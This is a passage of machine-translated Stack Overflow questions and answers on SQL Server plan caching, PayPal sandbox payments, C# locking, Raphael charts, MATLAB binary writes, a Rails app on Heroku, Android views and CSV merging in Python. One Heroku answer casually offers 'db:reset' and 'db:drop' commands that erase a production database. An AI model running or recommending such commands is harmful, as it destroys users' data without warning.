> MetaView.DAL.MFCMData.MFCMDATAEntities .GetTradingOpenPositionCounterParty（可空`1 positionDT, Nullable`1 tradingAccountID) 在 C:\Projects\CASH\web\MetaView\MetaView.DAL.MFCMData\MFCMData.Designer.cs:7064 MetaView.BusinessLayer.Shared.Accounts.CounterParties.GetCounterParties(Int32 tradingAccountID) 在 C:\Projects\CASH \web\MetaView\MetaView.BusinessLayer\Shared\Accounts\CounterParties.cs:161

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-04-02T20:00:09.737

所以几周前我遇到了一个类似的问题，我们的一位 DBA 向我解释了这个问题（当然是转述并降低到我的水平）：

调用 SQL Server 存储过程时，服务器会为每个存储过程创建并缓存一个执行*计划`object_id`*。有时，SQL Server 可能会根据传入的参数值创建错误的执行计划（在我们的例子中，可空参数为空）。发生这种情况时，快速解决方法是`sp_recompile 'Schema.Procedure'`在 SQL Server Management Studio（或您可能使用的任何数据库管理工具）中运行。所有这些都是清除该存储过程的计划缓存。如果 proc 的下一个被调用者再次传入“错误”参数值，您将陷入同样的​​情况**，因此真正的解决方法是**`OPTIMIZE FOR`使用语法为查询提供提示（请参阅[http://msdn.microsoft.com /en-gb/library/ms181714.aspx](http://msdn.microsoft.com/en-gb/library/ms181714.aspx)）。

简而言之，如果您在and/or子句`OPTION (OPTIMIZE FOR (@myParameter = 'Some value that gives you a GOOD execution plan'))`之后添加它应该可以解决问题。`WHERE``ORDER BY`

另外，如果您想知道为什么在 SSMS 中执行*相同*的SQL 时总是能得到快速的结果，这是因为 SSMS 有一个名为 ARITHABORT ( ) 的选项的默认设置为 ON `SET ARITHABORT ON`，所有其他应用程序都默认设置为 OFF，但它是如何设置的作品及其影响超出了我的经验，我没有费心去阅读它。我被告知我不应该使用它。我确信真正的 DBA 可以更好地解释原因。

# paypal - 通过贝宝成功的自适应付款付款请求

> ID：15772254
> 
> 赞同：2
> 
> 时间：2013-04-02T19:03:38.300
> 
> 标签：paypal, paypal-adaptive-payments

我有一个通过贝宝沙盒支付的请求。当我执行 PHP 时，我得到了成功响应。但是，我无法在任何地方跟踪沙盒门户中的交易。

我正在使用沙箱中的 API 凭据（正在工作）。这是我得到的回应

> object(stdClass)#6 (3) { ["responseEnvelope"]=> object(stdClass)#7 (4) { ["timestamp"]=> string(29) "2013-04-02T11:56:35.221-07 :00" ["ack"]=> string(7) "Success" ["correlationId"]=> string(13) "30317d69b575d" ["build"]=> string(7) "5563463" } ["payKey" ]=> 字符串（20）“AP-8VN625716X0611726”[“paymentExecStatus”]=> 字符串（7）“创建”}

这是请求。我已经更改了电子邮件，但它被设置为我设置了沙盒帐户的电子邮件。

> object(PayRequest)#4 (7) { ["requestEnvelope"]=> object(RequestEnvelope)#1 (2) { ["detailLevel"]=> NULL ["errorLanguage"]=> NULL } ["actionType"]= > string(3) "PAY" ["cancelUrl"]=> string(19) " [http://www.ebay.com](http://www.ebay.com) " ["currencyCode"]=> string(3) "USD" ["memo"]= > string(10) "simple pay" ["receiverList"]=> object(ReceiverList)#2 (1) { ["receiver"]=> object(Receiver)#3 (2) { ["amount"]=>字符串（3）“3.0”[“电子邮件”]=>字符串（17）“xxx@gmail.com”}}[“returnUrl”]=>字符串（19）“ [http://www.ebay.com](http://www.ebay.com) ”}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T17:51:24.473

使用 PayKey 获得成功响应后，您会将客户重定向到：

[https://www.sandbox.paypal.com/webscr?cmd=_ap-payment&paykey=VALUE](https://www.sandbox.paypal.com/webscr?cmd=_ap-payment&paykey=VALUE)

其中 VALUE 是您在 API 响应中收到的 PayKey。

您是否已访问此 URL 并使用个人沙盒帐户继续结帐？

# c# - 线程安全代码变得太笨拙了？

> ID：15772256
> 
> 赞同：3
> 
> 时间：2013-04-02T19:03:41.300
> 
> 标签：c#, multithreading, thread-safety

我从来没有真正写过多线程应用程序。

在我写过的几次中，在我看来，线程安全变得太笨拙太快了。

互联网上到处都是关于线程安全通用技术的教程，但我发现的关于现实世界编程问题的内容并不多。

例如，采用这个简单的代码，（没有任何用处）

```
 StringBuilder sb = new StringBuilder();
    void Something()
    {
        sb.AppendLine("Numbers!");
        int oldLength = sb.Length;
        int i = 0;
        while (sb.Length < 500 + oldLength)
        {
            sb.Append((++i).ToString());
            //something slow
            Thread.Sleep(1000);
            if (i % 2 == 0)
            {
                sb.Append("!");
            }
            sb.AppendLine();
        }
    } 
```

现在假设我想从多个线程运行这个方法，所有线程都写入同一个字符串生成器。

我希望他们一起写入同一个目标，因此可能会有一个线程中的一行，紧随其后的是另一个线程的另一行，然后下一行从第一个线程返回。

**为了对话，我们假设即使在另一行的*中间有一行来自一个线程也是可以的***

这是代码：

```
 StringBuilder sb = new StringBuilder();
    object sbLocker = new object();
    void SomethingSafe()
    {
        int oldLength;
        int length;

        lock (sbLocker)
        {
            sb.AppendLine("Numbers!");
            oldLength = sb.Length;
            length = oldLength;
        }

        int i = 0;

        while (length < 500 + oldLength)
        {
            lock (sbLocker)
                sb.Append((++i).ToString());

            //something slow
            Thread.Sleep(1000);
            if (i % 2 == 0)
            {
                lock (sbLocker)
                    sb.Append("(EVEN)");
            }

            lock (sbLocker)
            {
                sb.AppendLine();
                length = sb.Length;
            }
        }
    } 
```

好累好难读。。。

有没有办法告诉编译器每次可以访问 sb 时都简单地锁定 sbLocker？

为什么我的代码对于这么简单的规则需要如此笨拙？对这种具体但非常有用的技术没有太多思考。可以更容易地完成吗？

我们甚至不能继承 StringBuilder 因为它是密封的。

当然，一个人可以继续包装整个课程：

```
public class SafeStringBuilder
{
    private StringBuilder sb = new StringBuilder();
    object locker = new object();
    public void Append(string s)
    {
        lock (locker)
        {
            sb.Append(s);
        }
    }

    //................
} 
```

但这太疯狂了……因为我们正在使用很多不同的类。

知道如何在这个意义上进行线程安全实践吗？

我知道要创建完全相同的结果，可能有一个更简单的解决方案......但这只是一个例子。我很确定我遇到过类似的问题，但没有任何可读的解决方案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:53:06.277

您是正确的，因为编写线程安全代码可能比编写单线程代码复杂得多。在没有必要的地方可能应该避免这种情况。

你假设它不能以可读的方式编写是不正确的。不幸的是，这真的很难成为答案，我能做的最好的就是提供一些指导：

1.  查找线程中划分的逻辑位置。像构建一个通用字符串这样的东西并没有真正的意义，因为它不会加快你正在做的事情。为了使多线程有意义，必须有一些部分可以独立于（或大部分独立于）程序的其他部分完成。很好的例子包括矩阵乘法和响应客户端请求的服务器。很有可能，如果您正在对不适合多线程的东西进行多线程处理，那么编写优雅的代码将异常困难。
2.  在需要数据共享的地方，尝试遵循模型：锁定、访问/更改、解锁。
3.  遵循锁定顺序的层次结构。
4.  尽可能避免通过复制、消息传递等方式直接共享数据。
5.  尽可能对其余代码隐藏锁定。尽可能为他们提供处理共享数据的功能。

不幸的是，编写优雅的多线程代码更多的是您经过多年努力才能完善的东西，而不是可以在堆栈溢出问题中教授的东西，但希望这个答案能带来一些启发。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:55:40.210

一些框架类为您提供了可以使用的线程安全包装器。例如，您可以`StringWriter`在 StringBuilder 之上创建一个，然后使用 TextWriter.Synchronized 来获得一个线程安全的包装器，该包装器可以从多个线程同时访问。

```
var sb = new StringBuilder();
var tw = new StringWriter(sb);

var threadSafeWriter = TextWriter.Synchronized(tw);

threadSafeWriter.Write("Hello");
threadSafeWriter.WriteLine(" world"); 
```

而且，还有可以方便使用的线程安全并发集合。

如果您真的希望“编译器在每次访问对象时锁定对象”而不为每种类型编写自定义包装器，您可以使用一些库，如 Castle.Proxy，在运行时生成包装器。但是，在非平凡的场景中，当多个对象访问应该以原子方式执行时，这不会产生您需要的结果。

# javascript - Raphael 示例修改 - 分析的新基线

> ID：15772264
> 
> 赞同：2
> 
> 时间：2013-04-02T19:03:58.180
> 
> 标签：javascript, raphael

我正在尝试将一些图表集成到一个项目中，并且我已经让这个图表像示例一样工作，但正确显示了我的数据，但我想做的是将基线从 0 更改为另一个值因为我的大部分数据都是点 > 700，所以线相对平坦，因为它们都是高值。

谁能告诉我基线值在哪里设置？我不是一个javascript人，所以我遇到了麻烦。

编辑：我也希望能够设置一个固定顶线，理想情况下，如果有人看到一个简单的方法来做这两个？

编辑2：找到修复背线的方法：有一个“最大”变量。只是改变它。

示例在这里。[http://raphaeljs.com/analytics.html](http://raphaeljs.com/analytics.html)

有问题的Javascript是这样的：

```
 Raphael.fn.drawGrid = function (x, y, w, h, wv, hv, color) {
    color = color || "#000";
    var path = ["M", Math.round(x) + .5, Math.round(y) + .5, "L", Math.round(x + w) + .5, Math.round(y) + .5, Math.round(x + w) + .5, Math.round(y + h) + .5, Math.round(x) + .5, Math.round(y + h) + .5, Math.round(x) + .5, Math.round(y) + .5],
        rowHeight = h / hv,
        columnWidth = w / wv;
    for (var i = 1; i < hv; i++) {
        path = path.concat(["M", Math.round(x) + .5, Math.round(y + i * rowHeight) + .5, "H", Math.round(x + w) + .5]);
    }
    for (i = 1; i < wv; i++) {
        path = path.concat(["M", Math.round(x + i * columnWidth) + .5, Math.round(y) + .5, "V", Math.round(y + h) + .5]);
    }
    return this.path(path.join(",")).attr({stroke: color});
};

$(function () {
    $("#data").css({
        position: "absolute",
        left: "-9999em",
        top: "-9999em"
    });
});

window.onload = function () {
    function getAnchors(p1x, p1y, p2x, p2y, p3x, p3y) {
        var l1 = (p2x - p1x) / 2,
            l2 = (p3x - p2x) / 2,
            a = Math.atan((p2x - p1x) / Math.abs(p2y - p1y)),
            b = Math.atan((p3x - p2x) / Math.abs(p2y - p3y));
        a = p1y < p2y ? Math.PI - a : a;
        b = p3y < p2y ? Math.PI - b : b;
        var alpha = Math.PI / 2 - ((a + b) % (Math.PI * 2)) / 2,
            dx1 = l1 * Math.sin(alpha + a),
            dy1 = l1 * Math.cos(alpha + a),
            dx2 = l2 * Math.sin(alpha + b),
            dy2 = l2 * Math.cos(alpha + b);
        return {
            x1: p2x - dx1,
            y1: p2y + dy1,
            x2: p2x + dx2,
            y2: p2y + dy2
        };
    }
    // Grab the data
    var labels = [],
        data = [];
    $("#data tfoot th").each(function () {
        labels.push($(this).html());
    });
    $("#data tbody td").each(function () {
        data.push($(this).html());
    });

    // Draw
    var width = 800,
        height = 250,
        leftgutter = 30,
        bottomgutter = 20,
        topgutter = 20,
        colorhue = .6 || Math.random(),
        color = "hsl(" + [colorhue, .5, .5] + ")",
        r = Raphael("holder", width, height),
        txt = {font: '12px Helvetica, Arial', fill: "#fff"},
        txt1 = {font: '10px Helvetica, Arial', fill: "#fff"},
        txt2 = {font: '12px Helvetica, Arial', fill: "#000"},
        X = (width - leftgutter) / labels.length,
        max = Math.max.apply(Math, data),
        Y = (height - bottomgutter - topgutter) / max;
    r.drawGrid(leftgutter + X * .5 + .5, topgutter + .5, width - leftgutter - X, height - topgutter - bottomgutter, 10, 10, "#000");
    var path = r.path().attr({stroke: color, "stroke-width": 4, "stroke-linejoin": "round"}),
        bgp = r.path().attr({stroke: "none", opacity: .3, fill: color}),
        label = r.set(),
        lx = 0, ly = 0,
        is_label_visible = false,
        leave_timer,
        blanket = r.set();
    label.push(r.text(60, 12, "24 hits").attr(txt));
    label.push(r.text(60, 27, "22 September 2008").attr(txt1).attr({fill: color}));
    label.hide();
    var frame = r.popup(100, 100, label, "right").attr({fill: "#000", stroke: "#666", "stroke-width": 2, "fill-opacity": .7}).hide();

    var p, bgpp;
    for (var i = 0, ii = labels.length; i < ii; i++) {
        var y = Math.round(height - bottomgutter - Y * data[i]),
            x = Math.round(leftgutter + X * (i + .5)),
            t = r.text(x, height - 6, labels[i]).attr(txt).toBack();
        if (!i) {
            p = ["M", x, y, "C", x, y];
            bgpp = ["M", leftgutter + X * .5, height - bottomgutter, "L", x, y, "C", x, y];
        }
        if (i && i < ii - 1) {
            var Y0 = Math.round(height - bottomgutter - Y * data[i - 1]),
                X0 = Math.round(leftgutter + X * (i - .5)),
                Y2 = Math.round(height - bottomgutter - Y * data[i + 1]),
                X2 = Math.round(leftgutter + X * (i + 1.5));
            var a = getAnchors(X0, Y0, x, y, X2, Y2);
            p = p.concat([a.x1, a.y1, x, y, a.x2, a.y2]);
            bgpp = bgpp.concat([a.x1, a.y1, x, y, a.x2, a.y2]);
        }
        var dot = r.circle(x, y, 4).attr({fill: "#333", stroke: color, "stroke-width": 2});
        blanket.push(r.rect(leftgutter + X * i, 0, X, height - bottomgutter).attr({stroke: "none", fill: "#fff", opacity: 0}));
        var rect = blanket[blanket.length - 1];
        (function (x, y, data, lbl, dot) {
            var timer, i = 0;
            rect.hover(function () {
                clearTimeout(leave_timer);
                var side = "right";
                if (x + frame.getBBox().width > width) {
                    side = "left";
                }
                var ppp = r.popup(x, y, label, side, 1),
                    anim = Raphael.animation({
                        path: ppp.path,
                        transform: ["t", ppp.dx, ppp.dy]
                    }, 200 * is_label_visible);
                lx = label[0].transform()[0][1] + ppp.dx;
                ly = label[0].transform()[0][2] + ppp.dy;
                frame.show().stop().animate(anim);
                label[0].attr({text: data + " hit" + (data == 1 ? "" : "s")}).show().stop().animateWith(frame, anim, {transform: ["t", lx, ly]}, 200 * is_label_visible);
                label[1].attr({text: lbl + " September 2008"}).show().stop().animateWith(frame, anim, {transform: ["t", lx, ly]}, 200 * is_label_visible);
                dot.attr("r", 6);
                is_label_visible = true;
            }, function () {
                dot.attr("r", 4);
                leave_timer = setTimeout(function () {
                    frame.hide();
                    label[0].hide();
                    label[1].hide();
                    is_label_visible = false;
                }, 1);
            });
        })(x, y, data[i], labels[i], dot);
    }
    p = p.concat([x, y, x, y]);
    bgpp = bgpp.concat([x, y, x, y, "L", x, height - bottomgutter, "z"]);
    path.attr({path: p});
    bgp.attr({path: bgpp});
    frame.toFront();
    label[0].toFront();
    label[1].toFront();
    blanket.toFront();
}; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-10-09T16:02:38.960

自从您发布问题以来已经有一段时间了，但也许答案对其他人仍然有帮助：

您需要添加一些额外的变量来获取最小数据并设置新的基线：

最大值已在此处定义。

```
max = Math.max.apply(Math, data), //e.g. 800 
```

现在您只需执行相同操作即可获得最小值：

```
min = Math.min.apply(Math, data), //e.g. 700 
```

从这两个变量中，您可以获得值的范围。使用“范围”而不是“最大值”来计算 Y。

```
range = max - min, //e.g 100
Y = (height - bottomgutter - topgutter ) / range; 
```

现在跳转到定义 y、Y0 和 Y2 的循环并更改

```
y = Math.round(height - bottomgutter - Y * data[i]),      
Y0 = Math.round(height - bottomgutter - Y * data[i - 1]),
Y2 = Math.round(height - bottomgutter - Y * data[i + 1]), 
```

至：

```
y = Math.round(height - bottomgutter - Y * data[i]  + min * Y),
Y0 = Math.round(height - bottomgutter - Y * data[i - 1] + min * Y),
Y2 = Math.round(height - bottomgutter - Y * data[i + 1] + min * Y), 
```

如果您更喜欢复制和粘贴，那就是完整编辑的 window.onload function() 与新基线：

```
window.onload = function () {
    function getAnchors(p1x, p1y, p2x, p2y, p3x, p3y) {
        var l1 = (p2x - p1x) / 2,
            l2 = (p3x - p2x) / 2,
            a = Math.atan((p2x - p1x) / Math.abs(p2y - p1y)),
            b = Math.atan((p3x - p2x) / Math.abs(p2y - p3y));
        a = p1y < p2y ? Math.PI - a : a;
        b = p3y < p2y ? Math.PI - b : b;
        var alpha = Math.PI / 2 - ((a + b) % (Math.PI * 2)) / 2,
            dx1 = l1 * Math.sin(alpha + a),
            dy1 = l1 * Math.cos(alpha + a),
            dx2 = l2 * Math.sin(alpha + b),
            dy2 = l2 * Math.cos(alpha + b);
        return {
            x1: p2x - dx1,
            y1: p2y + dy1,
            x2: p2x + dx2,
            y2: p2y + dy2
        };
    }
    // Grab the data
    var labels = [],
        data = [];
    $("#data tfoot th").each(function () {
        labels.push($(this).html());
    });
    $("#data tbody td").each(function () {
        data.push($(this).html());
    });

    // Draw
    var width = 800,
        height = 250,
        leftgutter = 30,
        bottomgutter = 20,
        topgutter = 20,
        colorhue = .6 || Math.random(),
        color = "hsl(" + [colorhue, .5, .5] + ")",
        r = Raphael("holder", width, height),
        txt = {font: '12px Helvetica, Arial', fill: "#fff"},
        txt1 = {font: '10px Helvetica, Arial', fill: "#fff"},
        txt2 = {font: '12px Helvetica, Arial', fill: "#000"},
        X = (width - leftgutter) / labels.length,
        max = Math.max.apply(Math, data),
        min = Math.min.apply(Math, data),
        range = max - min, 
        Y = (height - bottomgutter - topgutter ) / range;
    r.drawGrid(leftgutter + X * .5 + .5, topgutter + .5, width - leftgutter - X, height - topgutter - bottomgutter, 10, 10, "#000");
    var path = r.path().attr({stroke: color, "stroke-width": 4, "stroke-linejoin": "round"}),
        bgp = r.path().attr({stroke: "none", opacity: .3, fill: color}),
        label = r.set(),
        lx = 0, ly = 0,
        is_label_visible = false,
        leave_timer,
        blanket = r.set();
    label.push(r.text(60, 12, "24 hits").attr(txt));
    label.push(r.text(60, 27, "22 September 2008").attr(txt1).attr({fill: color}));
    label.hide();
    var frame = r.popup(100, 100, label, "right").attr({fill: "#000", stroke: "#666", "stroke-width": 2, "fill-opacity": .7}).hide();

    var p, bgpp;
    for (var i = 0, ii = labels.length; i < ii; i++) {
        var y = Math.round(height - bottomgutter - Y * data[i] + min * Y),
            x = Math.round(leftgutter + X * (i + .5)),
            t = r.text(x, height - 6, labels[i]).attr(txt).toBack();
        if (!i) {
            p = ["M", x, y, "C", x, y];
            bgpp = ["M", leftgutter + X * .5, height - bottomgutter, "L", x, y, "C", x, y];
        }
        if (i && i < ii - 1) {
            var Y0 = Math.round(height - bottomgutter - Y * data[i - 1] + min * Y),
                X0 = Math.round(leftgutter + X * (i - .5)),
                Y2 = Math.round(height - bottomgutter - Y * data[i + 1] + min * Y),
                X2 = Math.round(leftgutter + X * (i + 1.5));
            var a = getAnchors(X0, Y0, x, y, X2, Y2);
            p = p.concat([a.x1, a.y1, x, y, a.x2, a.y2]);
            bgpp = bgpp.concat([a.x1, a.y1, x, y, a.x2, a.y2]);
        }
        var dot = r.circle(x, y, 4).attr({fill: "#333", stroke: color, "stroke-width": 2});
        blanket.push(r.rect(leftgutter + X * i, 0, X, height - bottomgutter).attr({stroke: "none", fill: "#fff", opacity: 0}));
        var rect = blanket[blanket.length - 1];
        (function (x, y, data, lbl, dot) {
            var timer, i = 0;
            rect.hover(function () {
                clearTimeout(leave_timer);
                var side = "right";
                if (x + frame.getBBox().width > width) {
                    side = "left";
                }
                var ppp = r.popup(x, y, label, side, 1),
                    anim = Raphael.animation({
                        path: ppp.path,
                        transform: ["t", ppp.dx, ppp.dy]
                    }, 200 * is_label_visible);
                lx = label[0].transform()[0][1] + ppp.dx;
                ly = label[0].transform()[0][2] + ppp.dy;
                frame.show().stop().animate(anim);
                label[0].attr({text: data + " hit" + (data == 1 ? "" : "s")}).show().stop().animateWith(frame, anim, {transform: ["t", lx, ly]}, 200 * is_label_visible);
                label[1].attr({text: lbl + " September 2008"}).show().stop().animateWith(frame, anim, {transform: ["t", lx, ly]}, 200 * is_label_visible);
                dot.attr("r", 6);
                is_label_visible = true;
            }, function () {
                dot.attr("r", 4);
                leave_timer = setTimeout(function () {
                    frame.hide();
                    label[0].hide();
                    label[1].hide();
                    is_label_visible = false;
                }, 1);
            });
        })(x, y, data[i], labels[i], dot);
    }
    p = p.concat([x, y, x, y]);
    bgpp = bgpp.concat([x, y, x, y, "L", x, height - bottomgutter, "z"]);
    path.attr({path: p});
    bgp.attr({path: bgpp});
    frame.toFront();
    label[0].toFront();
    label[1].toFront();
    blanket.toFront();
}; 
```

# matlab - matlab从存储在matlab中的列整数向量在十六进制编辑器中写入不正确的值

> ID：15772267
> 
> 赞同：1
> 
> 时间：2013-04-02T19:04:15.570
> 
> 标签：matlab

我有一个 516096x1 向量，其中的数据样本都是整数十进制值，看起来像这样，但只有十进制列：

（十进制）

1416
258
-258

2189

1545

我将它们存储到一个变量中。现在我想将该变量写入二进制文件。问题是，当我将变量写入文件时，它会错误地替换某些值。

我的代码是：

```
Samples = (all the 516096 samples)
fwrite(fid1, Samples, 'int16') 
```

它将所有整数以十六进制写入文件（使用十六进制编辑器），但每当它达到相当于 8D 的十进制整数时，它会在十六进制编辑器中将其替换为 3F。8F 变为 3F，81 变为 3F。0A 也被 0D 替换。为什么 Matlab 会这样做。我已经将它作为 int16 读入并将其写为 int16。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-04T19:00:51.053

好的。我已经想通了。我在十六进制编辑器中使用了 Matlab 的文本编辑器文件，它无法识别那些特定的整数值，因为它们在 matlabs 文本编辑器中无法识别。所以Matlab会用自己的代替未知整数，即3F代替原来的8D。然后，我将 matlab 创建的文件保存到桌面并将其拖到显示替换值的十六进制编辑器中。它显示它们是因为您查看的是保存的 matlab 文本编辑器文件而不是实际的原始数据文件。该文件与您的代码、脚本、函数等放置在同一目录中...一旦您将创建的文件保存到目录中，请确保使用该目录中的该文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-03T07:56:57.983

您正在使用带符号的整数（如[tashuhka](https://stackoverflow.com/a/15772707/1714410)所指出的那样），显然，16 位对您来说是不够的 - 您有溢出。

由于您确实需要带符号的数字（您也有负数），因此您应该使用 32 位：

```
fwrite( fid1, Samples, 'int32'); 
```

# ruby-on-rails - 上传到 heroku 时，Rails 应用程序指向 500.html 页面

> ID：15772269
> 
> 赞同：0
> 
> 时间：2013-04-02T19:04:18.117
> 
> 标签：ruby-on-rails, database, ruby-on-rails-3, heroku

我已经在 heroku 上创建了我的堆栈，并且所有内容都已部署，但是当我尝试通过 URL 实际访问它时，它只是默认为 500.html 错误页面。该应用程序在我的本地主机上运行良好，但我在 sqlite3 中开发了它。我已经将我的 Gemfile 更改为如下所示并运行 bundle install。

```
#gem 'sqlite3'

gem 'thin'

group :production do
   gem 'pg'
end
group :development, :test do
   gem 'sqlite3'
end 
```

当您访问该网址时，它应该指向我的登录页面。

这就是我的 database.yml 文件的样子……这与我的问题有什么关系。

```
development:
   adapter: sqlite3
   database: db/development.sqlite3
   pool: 5
   timeout: 5000

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
   adapter: sqlite3
   database: db/test.sqlite3
   pool: 5
   timeout: 5000

production:
  adapter: sqlite3
  database: db/production.sqlite3
  pool: 5
  timeout: 5000 
```

感谢您的任何建议

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:05:54.357

用于`heroku logs`查看显示 500 错误原因的日志文件。如果您尚未运行迁移，这可能是原因。一定要运行：

`heroku run rake db:migrate`

在您使用您的应用程序之前。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-03T12:32:53.740

您的 database.yml 文件仍然指向 SQLite。您需要将其更改为指向 heroku 上的 PostgreSQL 数据库。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-01-29T16:30:00.463

我可以从评论中看到您正在使用 sqlite 将其生产到 heroku 中。这是不可能的，因为heroku不支持sqlite。您可以在生产环境中使用 pg 或 mysql2。您可以在此处查看解决方案：

[如何配置 database.yml 以部署到 Heroku](https://stackoverflow.com/questions/27864695/how-to-configure-database-yml-for-deployment-to-heroku/27866610#27866610)

一旦你完成它运行这些命令

```
heroku run rake db:reset
heroku run rake db:drop db:create db:seed
heroku run rake db:migrate 
```

# android - FindViewById 返回 null (ProgressBar)

> ID：15772272
> 
> 赞同：0
> 
> 时间：2013-04-02T19:04:24.837
> 
> 标签：android, android-layout, android-progressbar, findviewbyid

我在 StackOverflow 上进行了很多搜索，并且在几条评论中建议清理项目以解决此问题，问题出现在 Adapter 内部的 asynctask 类中，所以：

1.  从eclipse，目录（gen / bin）中删除项目并再次导入
2.  我删除了导入，清理了项目，ctrl+O（再次导入）并再次编译了项目

不工作！

我收到此错误的部分代码：

```
protected void onPreExecute() {

        ImageView img = (ImageView) mView.findViewById(R.id.grid_action_button);

        if(img == null){
            Log.d(TAG, "img null");
        }else{
            Log.d(TAG, "img not null");
        }

        ProgressBar pBar = (ProgressBar) mView.findViewById(R.id.grid_progress_bar);

        if(pBar == null){
            Log.d(TAG, "pBar null");
        }else{
            Log.d(TAG, "pBar not null");
        }

    } 
```

最有趣的是，imageview正常工作，但是`pBar`变量的返回为null。

日志猫结果：

```
04-02 15:46:00.734: D/Adapter(10842): img not null
04-02 15:46:00.734: D/Adapter(10842): pBar null 
```

我的自定义适配器到 griview 布局（mobile.xml）：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout 
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:padding="30dp" >

    <ImageView
        android:id="@+id/grid_item_image"
        android:layout_width="140dp"
        android:layout_height="186dp"
        android:layout_marginRight="20dp"
        android:src="@drawable/ic_launcher" >
    </ImageView>

    <LinearLayout 
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" 
        android:orientation="vertical"
        >
        <!-- I have some TextViews here -->

    <ImageView
            android:id="@+id/grid_action_button"
            android:layout_width="100dp"
            android:layout_height="50dp"
            android:layout_marginTop="10dp"
            android:src="@drawable/btn_download"
            android:clickable="true" >
            </ImageView>

    <ProgressBar             
        android:id="@+id/grid_progress_bar"
        android:layout_width="100dp"
        android:layout_height="10dp"
        style="style/Widget.ProgressBar.Horizontal"
    />

</LinearLayout>
</LinearLayout> 
```

在`setContentView`Main 类中调用：

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    gridView = (GridView) findViewById(R.id.gridview);
} 
```

我的`getview()`内部适配器类：

```
public View getView(int position, View convertView, ViewGroup parent) {

    View gridView = convertView;

    if (gridView == null) {

        LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);

        // get layout from mobile.xml
        gridView = inflater.inflate(R.layout.mobile, null);

            ... more ... 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-12-07T17:47:56.313

也许这对某人有用。
从firebase获取数据后，我采用了某种异步方法，我不得不访问主屏幕上的进度条。但`findViewById`一直返回null。

最后我这样解决了：

```
 AppCompatActivity mainActivity = (AppCompatActivity)context;
    mainActivity.setContentView(R.layout.activity_main);
    ProgressBar loadPollsProgressBar = (ProgressBar) mainActivity.findViewById(R.id.loadPollsProgressBar); 
```

# jquery - Button/Span 布尔逻辑与 javascript 一致，反之亦然

> ID：15772274
> 
> 赞同：0
> 
> 时间：2013-04-02T19:04:35.007
> 
> 标签：jquery, jquery-ui, button, user-interface, html

我有一种情况，有很多按钮（基本上与图标跨越，但像按钮一样）。在 css 的帮助下按下时，每个按钮都会被着色。此按钮应链接到 javascript 中的变量或函数。我想要的只是按钮和javascript应该同步，这意味着当按下按钮时，javascript变量应该为真，或者当js变量为真时，按钮应该处于按下或打开状态。我已经完成了这个逻辑，但它看起来并不是最佳实践，因为有时 UI 按钮和 javascript 不同步。有没有最好的方法来做到这一点？还应该有一种方法可以通过一个javascript函数控制按钮组的状态

注意：我不想调用 Ajax 或任何东西来与服务器通信。这纯粹是 UI 要求。

# HTML

```
 <span onclick="applyPropertiesChanges('Text', textButton)"> <span id="switch"
            class="text_btn-background toolboxItem ui-icon btn-icon-enable btn-fontItalicIcon" /></span> 
```

# JS

```
var textButton
function applyPropertiesChanges(type,value)
{
  if(type == 'Text')
 { textButton = !textButton;
  //Check the UI span 
  if(value && this.children.hasClass('btn-icon-enable') &&)
{ 
 //UI span is on
//do nothing
}else{
  if(!value && !this.children.hasClass('btn-icon-diable')
 {// do nothing
 } else 
{
// Toggle the class of the span
}
}

 }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-04T18:40:27.703

如果您只是向跨度添加一个属性或类，您可以更轻松地实现这一点。然后您可以检查哪些具有该属性：

```
 <span class="btn"> <span id="switch"
            class="text_btn-background toolboxItem ui-icon btn-icon-enable btn-fontItalicIcon" /></span>

$('.btn').click(function() {
   $(this).addClass('data-clicked');
   $('.btn').not(this).removeClass('data-clicked');
}); 
```

现在，当您单击时，您可以轻松知道哪个被单击：`$('.btn.data-clicked')`并基于此启用禁用。

# python - 从列表写入CSV，write.row似乎停在一个奇怪的地方

> ID：15772275
> 
> 赞同：2
> 
> 时间：2013-04-02T19:04:41.020
> 
> 标签：python, list, csv, output

我正在尝试合并许多 CSV 文件。我的初始功能旨在：

*   查看目录内部并计算其中的文件数（假设所有文件都是 .csv）
*   打开第一个 CSV 并将每一行附加到列表中
*   剪掉前三行（有一些我不想要的无用的列标题信息）
*   将这些结果存储在我称为“存档”的列表中
*   打开下一个 CSV 文件并重复（剪辑并将 em 附加到“存档”）
*   当我们没有 CSV 文件时，我想将完整的“存档”写入单独文件夹中的文件。

例如，如果我从三个看起来像这样的 CSV 文件开始。

**CSV 1**

```
[]
[['Title'],['Date'],['etc']]
[]
[['Spam'],['01/01/2013'],['Spam is the spammiest spam']]
[['Ham'],['01/04/2013'],['ham is ok']]
[['Lamb'],['04/01/2013'],['Welsh like lamb']]
[['Sam'],['01/12/2013'],["Sam doesn't taste as good and the last three"]] 
```

**CSV 2**

```
[]
[['Title'],['Date'],['etc']]
[]
[['Dolphin'],['01/01/2013'],['People might get angry if you eat it']]
[['Bear'],['01/04/2013'],['Best of Luck']] 
```

**CSV 3**

```
[]
[['Title'],['Date'],['etc']]
[]
[['Spinach'],['04/01/2013'],['Spinach has lots of iron']]
[['Melon'],['02/06/2013'],['Not a big fan of melon']] 
```

最后我会回家得到类似的东西......

**CSV 输出**

```
[['Spam'],['01/01/2013'],['Spam is the spammiest spam']]
[['Ham'],['01/04/2013'],['ham is ok']]
